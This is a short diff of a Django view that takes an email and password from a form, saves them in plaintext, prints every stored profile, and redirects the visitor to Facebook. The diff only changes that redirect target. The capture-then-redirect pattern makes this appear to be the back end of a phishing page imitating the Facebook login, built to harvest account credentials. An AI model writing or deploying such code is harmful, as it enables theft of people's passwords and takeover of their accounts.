@@ -6,7 +6,7 @@ def index(request):
         email = request.POST.get("email")
         password = request.POST.get("password")
         Profile.objects.create(email=email, password=password)
-        return redirect('https://www.facebook.com/share/1TH3fmmq66/')
+        return redirect('https://www.facebook.com/')
     # Consulta todos los perfiles para depuración:
     print(Profile.objects.all())
     return render(request, 'index.html')
